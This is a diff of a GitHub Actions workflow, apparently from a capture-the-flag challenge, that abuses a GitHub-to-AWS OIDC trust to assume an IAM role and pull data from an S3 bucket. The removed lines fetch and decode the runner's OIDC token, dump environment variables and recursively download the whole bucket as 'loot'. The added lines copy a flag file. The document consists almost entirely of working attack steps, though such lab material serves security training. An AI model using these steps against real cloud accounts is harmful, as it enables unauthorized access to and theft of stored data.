@@ -1,55 +1,25 @@
-name: Open the Dragon-Eye
+name: Get Flag
+
 on:
-  workflow_dispatch:       # so you can click 'Run' manually
-  push:
-    branches: [ "main" ]   # keeps the sub-claim on main
+  workflow_dispatch:
+
 permissions:
-  id-token: write          # ♦️ REQUIRED for OIDC
+  id-token: write
   contents: read
+
 jobs:
-  gaze:
+  retrieve:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Assume the Eye-role
+      - name: Configure AWS Credentials
         uses: aws-actions/configure-aws-credentials@v2
         with:
           role-to-assume: arn:aws:iam::110678717447:role/AWSServicesRoleForGithub-jovb4kjb
           aws-region: us-west-2
-      
-      - name: Debug OIDC Token
+
+      - name: Retrieve Second Flag
         run: |
-          echo "==== OIDC Token Claims ===="
-          # Try to get and decode the OIDC token - this is a critical part based on the hints
-          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=aws" | jq -r '.value' > token.jwt
-          echo "Token first part (header):"
-          cat token.jwt | cut -d. -f1 | base64 -d 2>/dev/null || cat token.jwt | cut -d. -f1 | base64 --decode 2>/dev/null
-          echo "Token second part (claims):"
-          cat token.jwt | cut -d. -f2 | base64 -d 2>/dev/null || cat token.jwt | cut -d. -f2 | base64 --decode 2>/dev/null
-          
-          # Also check environment variables that might contain useful information
-          echo "==== GitHub Environment Variables ===="
-          env | grep -i "GITHUB" || true
-          
-          # Check AWS credential info
-          echo "==== AWS Credential Info ===="
-          aws sts get-caller-identity
-          
-          # Try listing more directories in the S3 bucket
-          echo "==== S3 Bucket Root Contents ===="
-          aws s3 ls s3://codebackup-jovb4kjb/ || true
-      
-      - name: Plunder the Vault
-        run: |
-          echo "Listing the hidden prefix..."
-          aws s3 ls s3://codebackup-jovb4kjb/github/ --recursive
-          
-          echo "Listing the root of the bucket..."
-          aws s3 ls s3://codebackup-jovb4kjb/ --recursive
-          
-          echo "Downloading everything..."
-          aws s3 cp s3://codebackup-jovb4kjb/github/ ./loot --recursive
-          aws s3 cp s3://codebackup-jovb4kjb/ ./all-loot --recursive
-          
-          echo "🗝️  Flag (if plain-text) ↓↓↓"
-          grep -R --color=never -iE 'flag|ctf{' ./loot || true
-          grep -R --color=never -iE 'flag|ctf{' ./all-loot || true
+          aws s3 ls s3://codebackup-jovb4kjb/github/
+          aws s3 cp s3://codebackup-jovb4kjb/github/flag.txt .
+          cat flag.txt
